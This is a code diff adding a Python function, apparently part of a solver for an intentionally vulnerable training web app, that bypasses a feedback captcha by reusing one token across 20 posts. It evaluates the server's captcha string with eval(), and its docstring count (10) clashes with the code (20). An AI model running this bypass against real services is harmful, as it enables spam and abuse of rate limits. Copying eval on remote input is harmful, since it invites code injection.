@@ -208,7 +208,27 @@ def submit_misc_reports(server, session):
             pass
     print('Success.')
 
-
+def solve_captcha_bypass(server, session):
+    """
+    Submit 10 feedbacks quickly to bypass CAPTCHA rate limiting (or lack thereof) 
+    by reusing the same captcha token/solution multiple times.
+    """
+    print('Attempting Captcha Bypass (20 feedbacks)...'),
+    try:
+        # Get a valid captcha first
+        captcha_resp = session.get('{}/rest/captcha'.format(server)).json()
+        payload = {
+            'comment': 'captcha bypass',
+            'rating': 1,
+            'captchaId': captcha_resp.get('captchaId'),
+            'captcha': str(eval(captcha_resp.get('captcha')))
+        }
+        
+        # Send frequent requests with SAME captcha
+        for i in range(20):
+             session.post('{}/api/Feedbacks'.format(server), json=payload)
+    except Exception:
+        pass
     print('Success.')
 
 def like_review_url_new_session(token, url, payload):
